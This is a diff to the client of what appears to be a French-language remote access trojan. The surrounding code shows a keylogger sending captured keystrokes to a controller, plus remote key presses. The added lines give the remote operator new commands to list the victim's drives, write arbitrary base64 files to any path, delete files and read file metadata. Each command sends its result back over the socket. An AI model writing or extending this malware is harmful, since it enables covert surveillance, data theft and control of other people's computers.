@@ -132,6 +132,30 @@ def start_client():
                 logs = keylogger.get_logs()
                 send_data(s_cmd, logs if logs else "[Aucune frappe détectée]")
 
+            elif command == "list_drives":
+                try:
+                    import string
+                    from ctypes import windll
+
+                    drives = []
+                    bitmask = windll.kernel32.GetLogicalDrives()
+                    for i in range(26):
+                        if bitmask & (1 << i):
+                            drives.append(f"{string.ascii_uppercase[i]}:/")
+                    send_data(s_cmd, "\n".join(drives))
+                except:
+                    send_data(s_cmd, "[Erreur récupération lecteurs]")
+
+            elif command.startswith("writefile"):
+                try:
+                    parts = command.split(" ", 2)
+                    path = parts[1]
+                    content_b64 = parts[2]
+                    result = file_manager.write_file(path, content_b64)
+                    send_data(s_cmd, result)
+                except Exception as e:
+                    send_data(s_cmd, f"Erreur: {e}")
+
             elif command.startswith("readfile"):
                 path = command.split(" ", 1)[1] if " " in command else ""
                 result = file_manager.read_file(path)
@@ -146,6 +170,16 @@ def start_client():
                     pyautogui.press(key)
                 except Exception as e:
                     print(f"[client] Erreur touche spéciale : {key} -> {e}")
+
+            elif command.startswith("deletefile"):
+                path = command.split(" ", 1)[1]
+                result = file_manager.delete_file(path)
+                send_data(s_cmd, result)
+
+            elif command.startswith("metadata"):
+                path = command.split(" ", 1)[1]
+                result = file_manager.get_metadata(path)
+                send_data(s_cmd, result)
 
             elif command.startswith("scroll"):
                 try:
